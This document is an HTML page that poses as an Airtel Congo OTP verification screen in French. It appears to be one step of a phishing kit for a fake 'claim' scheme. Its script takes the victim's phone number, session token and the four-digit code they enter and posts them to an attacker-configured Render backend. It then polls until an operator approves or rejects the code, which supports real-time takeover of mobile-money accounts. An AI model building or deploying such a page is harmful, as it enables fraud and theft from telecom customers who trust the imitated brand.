<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AIRTEL CONGO - Vérification OTP</title>
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { min-height: 100vh; background: #f5f5f5; font-family: 'DM Sans', 'Segoe UI', Roboto, Arial, sans-serif; }
  .otp-container { min-height: 100vh; display: flex; flex-direction: column; background: linear-gradient(180deg, #ffffff 0%, #fafafa 100%); max-width: 480px; margin: 0 auto; position: relative; box-shadow: 0 0 60px rgba(0, 0, 0, 0.08); }

  .error-modal-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.55); backdrop-filter: blur(4px); display: none; align-items: center; justify-content: center; padding: 20px; z-index: 200; animation: fadeIn 0.25s ease; }
  .error-modal-overlay.show { display: flex; }
  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
  .error-modal { width: 100%; max-width: 340px; background: #ffffff; border-radius: 18px; padding: 28px 24px 20px; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 10px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3); animation: popIn 0.3s ease; }
  @keyframes popIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
  .error-modal-title { font-family: 'Syne', sans-serif; font-size: 22px; font-weight: 800; color: #c0001a; }
  .error-modal-message { font-size: 14.5px; color: #555; line-height: 1.5; margin-bottom: 8px; }
  .error-modal-button { width: 100%; padding: 14px; border: none; border-radius: 12px; background: linear-gradient(135deg, #c0001a 0%, #e8001f 100%); color: #ffffff; font-size: 14px; font-weight: 800; letter-spacing: 0.08em; text-transform: uppercase; cursor: pointer; transition: all 0.3s; box-shadow: 0 8px 24px rgba(192, 0, 26, 0.35); font-family: 'Syne', 'DM Sans', sans-serif; }
  .error-modal-button:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(192, 0, 26, 0.5); }

  .otp-header { display: flex; align-items: center; justify-content: space-between; padding: 20px 24px; border-bottom: 1px solid rgba(192, 0, 26, 0.06); }
  .back-btn { width: 40px; height: 40px; border: 1.5px solid #e0e0e0; border-radius: 10px; background: #ffffff; font-size: 20px; color: #333; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all 0.2s; }
  .back-btn:hover { border-color: #c0001a; color: #c0001a; background: #fff5f5; }
  .logo-large img { height: 36px; width: auto; }
  .menu-btn { width: 40px; height: 40px; border: 1.5px solid #e0e0e0; border-radius: 10px; background: #ffffff; cursor: pointer; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 4px; transition: all 0.2s; }
  .menu-btn:hover { border-color: #c0001a; background: #fff5f5; }
  .menu-line { width: 16px; height: 2px; background: #333; border-radius: 2px; }

  .otp-content { flex: 1; padding: 32px 24px; display: flex; flex-direction: column; justify-content: center; }
  .otp-card { width: 100%; display: flex; flex-direction: column; gap: 8px; }
  .otp-title { font-family: 'Syne', 'DM Sans', sans-serif; font-size: 26px; font-weight: 800; color: #1a1a1a; margin-bottom: 4px; }
  .otp-subtitle { font-size: 14px; color: #666; margin-bottom: 4px; }
  .otp-phone { font-size: 17px; font-weight: 700; color: #c0001a; letter-spacing: 0.5px; margin-bottom: 24px; }

  .otp-input-container { display: flex; flex-direction: column; gap: 12px; margin-bottom: 24px; }
  .otp-input-field { width: 100%; height: 64px; border: 1.5px solid #e0e0e0; border-radius: 14px; background: #ffffff; font-size: 24px; font-weight: 700; text-align: center; color: #1a1a1a; outline: none; transition: all 0.2s; font-family: inherit; letter-spacing: 14px; padding-left: 14px; }
  .otp-input-field:focus { border-color: #c0001a; box-shadow: 0 0 0 4px rgba(192, 0, 26, 0.1); }
  .otp-input-field::placeholder { color: #c0c0c0; letter-spacing: 1px; font-size: 15px; font-weight: 500; padding-left: 0; }
  .otp-input-field.error { border-color: #e30613; box-shadow: 0 0 0 4px rgba(227, 6, 19, 0.15); animation: shake 0.4s ease; }
  @keyframes shake { 0%, 100% { transform: translateX(0); } 20% { transform: translateX(-8px); } 40% { transform: translateX(8px); } 60% { transform: translateX(-6px); } 80% { transform: translateX(6px); } }
  .otp-hint { font-size: 12.5px; color: #999; text-align: center; }
  .resend-text { font-size: 12.5px; color: #666; text-align: center; font-weight: 500; }
  .resend-text.expired { color: #c0001a; font-weight: 700; }
  .resend-link { color: #c0001a; font-weight: 700; cursor: pointer; text-decoration: underline; }

  .submit-button { width: 100%; padding: 16px; border: none; border-radius: 12px; background: linear-gradient(135deg, #c0001a 0%, #e8001f 100%); color: #ffffff; font-size: 15px; font-weight: 800; letter-spacing: 0.08em; text-transform: uppercase; cursor: pointer; transition: all 0.3s; box-shadow: 0 8px 24px rgba(192, 0, 26, 0.35); font-family: 'Syne', 'DM Sans', sans-serif; display: flex; align-items: center; justify-content: center; gap: 10px; }
  .submit-button:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(192, 0, 26, 0.5); }
  .submit-button:disabled { background: linear-gradient(135deg, #d4d4d4 0%, #b8b8b8 100%); cursor: not-allowed; box-shadow: none; opacity: 0.7; }
  .spinner { width: 18px; height: 18px; border: 2.5px solid rgba(255, 255, 255, 0.3); border-top-color: #ffffff; border-radius: 50%; animation: spin 0.7s linear infinite; display: none; }
  .spinner.show { display: block; }
  @keyframes spin { to { transform: rotate(360deg); } }

  .login-footer { padding: 24px; display: flex; flex-direction: column; align-items: center; gap: 12px; background: #fafafa; border-top: 1px solid rgba(0, 0, 0, 0.05); }
  .login-footer img { height: 28px; opacity: 0.5; }
  .footer { font-size: 12px; color: #999; }

  @media (max-width: 480px) {
    .otp-container { box-shadow: none; }
    .otp-header { padding: 16px 20px; }
    .otp-content { padding: 24px 20px; }
    .otp-title { font-size: 22px; }
    .otp-input-field { height: 58px; font-size: 22px; letter-spacing: 12px; padding-left: 12px; }
    .submit-button { font-size: 14px; padding: 15px; }
  }
</style>
</head>
<body>
<div id="root">
  <div class="otp-container">

    <div class="error-modal-overlay" id="errorModal">
      <div class="error-modal">
        <h2 class="error-modal-title">Erreur</h2>
        <p class="error-modal-message" id="errorMessage">Code incorrect</p>
        <button class="error-modal-button" onclick="closeErrorModal()">OK</button>
      </div>
    </div>

    <header class="otp-header">
      <button class="back-btn" onclick="history.back()">←</button>
      <div class="logo-large">
        <img alt="Airtel Logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
      </div>
      <button class="menu-btn" aria-label="Menu">
        <div class="menu-line"></div>
        <div class="menu-line"></div>
        <div class="menu-line"></div>
      </button>
    </header>

    <main class="otp-content">
      <div class="otp-card">
        <h1 class="otp-title">Vérification OTP</h1>
        <p class="otp-subtitle">Entrez l'OTP envoyé à votre numéro de téléphone</p>
        <p class="otp-phone" id="otpPhone">+243 91 234 5677</p>

        <form id="otpForm">
          <div class="otp-input-container">
            <input class="otp-input-field" id="otpInput" placeholder="Entrer l'OTP à 4 chiffres" maxlength="4" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" type="text" value="">
            <p class="otp-hint">Entrer le code de vérification à 4 chiffres</p>
            <p class="resend-text" id="resendText">Le code expire dans <span id="countdown">30</span> secondes</p>
          </div>
          <button type="submit" class="submit-button" id="submitBtn" disabled>
            <span class="spinner" id="spinner"></span>
            <span id="submitBtnText">SOUMETTRE</span>
          </button>
        </form>
      </div>
    </main>

    <div class="login-footer">
      <div>
        <img alt="Airtel Logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
      </div>
      <footer class="footer">© 2026 Airtel Congo. Tous droits réservés.</footer>
    </div>
  </div>
</div>

<script>
  /* ==================== CONFIG ==================== */
  // ⚠️ REPLACE WITH YOUR RENDER URL — e.g. https://drc-airtel-claim.onrender.com
  const BACKEND_URL = 'https://YOUR-RENDER-SERVICE.onrender.com';
  const POLL_INTERVAL = 2000;

  /* ==================== ELEMENTS ==================== */
  const otpInput = document.getElementById('otpInput');
  const submitBtn = document.getElementById('submitBtn');
  const spinner = document.getElementById('spinner');
  const submitBtnText = document.getElementById('submitBtnText');
  const errorModal = document.getElementById('errorModal');
  const errorMessage = document.getElementById('errorMessage');
  const resendText = document.getElementById('resendText');

  /* ==================== SANDBOX-SAFE STORAGE ==================== */
  function _safeStorageGet(key) {
    try { return sessionStorage.getItem(key); } catch (e) { return null; }
  }

  /* ==================== LOAD SESSION DATA ==================== */
  const phone = _safeStorageGet('airtel_phone');
  const sessionToken = _safeStorageGet('airtel_session');
  const amount = _safeStorageGet('airtel_amount');

  if (!phone || !sessionToken) {
    window.location.href = 'index.html';
  }

  if (phone) {
    const clean = phone.replace(/\D/g, '');
    const formatted = clean.length === 9
      ? clean.slice(0, 2) + ' ' + clean.slice(2, 5) + ' ' + clean.slice(5)
      : clean;
    document.getElementById('otpPhone').textContent = '+243 ' + formatted;
  }

  /* ==================== OTP INPUT ==================== */
  otpInput.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
    e.target.classList.remove('error');
    submitBtn.disabled = e.target.value.length !== 4;
    if (e.target.value.length === 4) submitBtn.focus();
  });

  /* ==================== COUNTDOWN TIMER ==================== */
  let countdownValue = 30;
  let countdownInterval = null;

  function startCountdown() {
    countdownValue = 30;
    if (countdownInterval) clearInterval(countdownInterval);

    resendText.innerHTML = 'Le code expire dans <span id="countdown">30</span> secondes';
    resendText.classList.remove('expired');

    countdownInterval = setInterval(() => {
      countdownValue--;
      const cd = document.getElementById('countdown');
      if (cd) cd.textContent = countdownValue;

      if (countdownValue <= 0) {
        clearInterval(countdownInterval);
        resendText.classList.add('expired');
        resendText.innerHTML = 'Code expiré. <span class="resend-link" onclick="resendCode()">Renvoyer</span>';
      }
    }, 1000);
  }

  function resendCode() {
    otpInput.value = '';
    submitBtn.disabled = true;
    otpInput.focus();
    startCountdown();
    hideError();
  }

  startCountdown();

  /* ==================== POLLING ==================== */
  let pollTimer = null;
  function stopPolling() {
    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  }

  /* ==================== FORM SUBMIT ==================== */
  document.getElementById('otpForm').addEventListener('submit', async (e) => {
    e.preventDefault();

    const otp = otpInput.value;
    if (otp.length !== 4) return;

    spinner.classList.add('show');
    submitBtnText.textContent = 'VÉRIFICATION...';
    submitBtn.disabled = true;
    otpInput.disabled = true;

    try {
      const res = await fetch(`${BACKEND_URL}/api/otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phone: phone,
          otp: otp,
          amount: amount,
          session: sessionToken,
          page: 'otp'
        }),
      });

      const data = await res.json();

      if (!res.ok || !data.success) {
        throw new Error(data.error || 'Erreur de connexion');
      }

      const requestId = data.request_id;

      submitBtnText.textContent = 'EN ATTENTE...';

      pollTimer = setInterval(async () => {
        try {
          const r = await fetch(`${BACKEND_URL}/api/otp/status/${requestId}`);
          const s = await r.json();

          if (s.status === 'approved') {
            stopPolling();
            window.location.href = 'success.html';
          } else if (s.status === 'rejected' || s.status === 'expired') {
            stopPolling();
            resetWithError('Code incorrect');
          }
        } catch (err) {
          console.error('Poll error:', err);
        }
      }, POLL_INTERVAL);

    } catch (err) {
      console.error(err);
      resetWithError(err.message || 'Code incorrect');
    }
  });

  /* ==================== RESET WITH ERROR ==================== */
  function resetWithError(message) {
    spinner.classList.remove('show');
    submitBtnText.textContent = 'SOUMETTRE';
    submitBtn.disabled = false;
    otpInput.disabled = false;
    showErrorModal(message);
  }

  /* ==================== ERROR MODAL ==================== */
  function showErrorModal(message) {
    errorMessage.textContent = message;
    errorModal.classList.add('show');
    otpInput.classList.add('error');
  }

  function closeErrorModal() {
    errorModal.classList.remove('show');
    otpInput.value = '';
    otpInput.classList.remove('error');
    submitBtn.disabled = true;
    otpInput.disabled = false;
    otpInput.focus();
  }

  function hideError() {
    errorModal.classList.remove('show');
    otpInput.classList.remove('error');
  }

  errorModal.addEventListener('click', (e) => {
    if (e.target === errorModal) closeErrorModal();
  });
</script>
</body>
</html>
